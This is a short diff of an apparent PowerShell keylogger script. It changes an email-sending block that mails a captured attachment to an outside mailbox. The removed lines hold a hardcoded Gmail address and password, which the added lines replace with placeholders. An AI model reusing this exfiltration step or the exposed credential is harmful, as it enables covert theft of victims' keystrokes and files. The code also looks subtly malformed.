@@ -68,11 +68,11 @@ try
 {
     Send-Email
         -attechment $Att
-        -To "testingforkeylogger@gmail.com"
+        -To "Client Email Address"
         -Body $Body
         -Subject $Subj
-        -Password "testingforkeylogger123."
-        -From "testingforkeylogger@gmail.com"
+        -Password "your email password"
+        -From "your email address"
 
 
 }
